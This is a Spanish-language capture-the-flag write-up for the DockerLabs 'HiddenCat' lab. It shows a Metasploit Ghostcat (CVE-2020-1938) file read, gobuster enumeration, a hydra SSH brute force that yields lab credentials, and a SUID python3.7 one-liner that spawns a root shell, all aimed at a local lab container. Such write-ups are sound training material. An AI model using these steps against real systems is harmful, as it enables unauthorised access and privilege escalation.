---
title: "DockerLabs - HiddenCat"
difficulty: ""
source: "DockerLabs"
status: "WIP"
date: "2026-07-21"
---

Laboratorio para practicar la explotación de Apache Tomcat (Ghostcat) y escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh hiddencat.tar
```

## Explotación

### CVE-2020-1938 — Ghostcat (AJP)

```
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 172.17.0.2
run
```

Lectura de `WEB-INF/web.xml` via AJP sin autenticación. Contenido relevante:

```xml
<description>
  Welcome to Tomcat, Jerry ;)
</description>
```

**Usuario potencial: `jerry`**

### Enumeración web (Tomcat)

```bash
gobuster dir -u http://172.17.0.2:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/Apache-Tomcat.txt -x php,txt,sql,zip,bak -t 50
```

Sin resultados relevantes.

### Fuerza bruta SSH

```bash
hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

**Credenciales:** `jerry:chocolate`

```bash
ssh jerry@172.17.0.2
```

## Escalada de privilegios

SUID en `/usr/bin/python3.7`:

```bash
find / -perm -4000 -user root 2>/dev/null
# Resultado relevante: /usr/bin/python3.7

python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Root conseguido.** ✓

---

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

**Resultados:**
- `22/tcp` — SSH
- `8009/tcp` — AJP (Apache JServ Protocol)
- `8080/tcp` — Apache Tomcat 9

